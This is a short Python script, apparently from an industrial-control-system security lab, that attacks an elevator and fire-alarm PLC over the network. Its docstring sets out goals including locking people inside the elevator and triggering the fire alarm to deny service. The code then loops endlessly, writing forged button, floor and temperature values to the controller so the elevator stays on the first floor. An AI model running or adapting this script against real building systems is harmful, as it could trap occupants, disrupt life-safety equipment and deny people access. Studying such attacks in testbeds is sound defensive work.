"""Elevator fire alarm system attack :
 1 If moving =true is detected and moving is set to true from now on, the person in the elevator will be locked in the elevator; 
 2 Change the temperature, so that the fire alarm,DOS attack, elevator can not run normally; 
 3 Record the last target floor. If the elevator is still moving when the last target floor is reached,anomaly Behavior; 
 4 Repeatedly trigger the elevator button on the first floor, and set the stair level to 2 all the time. Expectation: The elevator has been stopped on the first floor, and people on the second floor cannot use it
"""

# 4 attack

import time
from pycomm.ab_comm.clx import Driver as ClxDriver

PLC_IPS = {
    'plc1': '192.168.1.151',
}

# label name
BUTTON_LEVEL1_TAG = 'ButtonLevel1'
CURRENT_LEVEL_TAG = 'currentLevel'
MOVING_TAG = 'moving'
THRES_TEMP_TAG = 'ThresTemp'

def write_plc_tag(plc, tag_name, value, tag_type):
    try:
        plc.write_tag(tag_name, value, tag_type)
    except Exception as e:
        print("Error writing tag:", e)

def attack_elevator(plc_ip):
    plc = ClxDriver()
    if plc.open(plc_ip):
        while True:
            try:
                # Keep triggering the first floor elevator button
                write_plc_tag(plc, BUTTON_LEVEL1_TAG, 1, 'BOOL')

                # Set the current floor to 2
                write_plc_tag(plc, CURRENT_LEVEL_TAG, 2, 'INT')

                # Simulate attack, continuously write high temperature value
                write_plc_tag(plc, THRES_TEMP_TAG, 50, 'REAL')

                time.sleep(1)  # Set the write interval
            except Exception as e:
                print("Error:", e)
                break
        plc.close()
    else:
        print("Unable to open", plc_ip)

def main():
    attack_elevator(PLC_IPS['plc1'])

if __name__ == '__main__':
    main()
